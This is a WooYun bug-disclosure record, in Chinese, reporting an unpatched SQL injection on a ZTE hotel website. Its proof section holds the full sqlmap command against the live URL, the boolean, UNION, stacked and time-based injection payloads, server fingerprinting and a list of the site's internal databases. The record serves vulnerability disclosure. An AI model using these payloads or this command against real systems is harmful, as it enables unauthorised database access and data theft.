wybug_title: 中兴通讯某站SQL注入漏洞仍未进行修复
wybug_corp: 中兴通讯股份有限公司
wybug_detail: 漏洞详情 披露状态：   									2015-02-25：	细节已通知厂商并且等待厂商处理中									2015-02-26：	厂商已经确认，细节仅向厂商公开									2015-03-08：	细节向核心白帽子及相关领域专家公开									2015-03-18：	细节向普通白帽子公开									2015-03-28：	细节向实习白帽子公开									2015-04-13：	细节向公众公开  简要描述： 挖历史漏洞 详细说明：  漏洞地址：http://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE001漏洞发现者： WooYun: 中兴通讯某站sa权限注入可内网渗透 漏洞未修补   漏洞证明：  root@kali:~# sqlmap -u "http://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE001" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:23:57[13:23:57] [INFO] resuming back-end DBMS 'microsoft sql server' [13:23:58] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=ZTE001' AND 3044=3044 AND 'pDTx'='pDTx    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: id=-2432' UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(99)+CHAR(118)+CHAR(113)+CHAR(83)+CHAR(82)+CHAR(118)+CHAR(98)+CHAR(109)+CHAR(101)+CHAR(69)+CHAR(71)+CHAR(111)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(116)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=ZTE001'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=ZTE001' WAITFOR DELAY '0:0:5'-----[13:23:59] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[13:23:59] [INFO] fetching database names[13:23:59] [INFO] the SQL query used returns 21 entriesavailable databases [20]:                                                      [*] DotNetCms[*] hotelplan[*] hr[*] Lsmis_nanJing[*] Lsmis_shangHai[*] Lsmis_xiAn[*] master[*] model[*] msdb[*] MyPhoto[*] New iCall[*] OfficeAnywhere[*] ReportServer[*] ReportServerTempDB[*] Restaurant[*] SMS_Mail[*] SSMISDIYDB[*] tempdb[*] TYCRM[*] XL_Attendance[13:23:59] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/www.ztehotel.com'[*] shutting down at 13:23:59   修复方案：  NULL   版权声明：转载请注明来源 Arthur@乌云
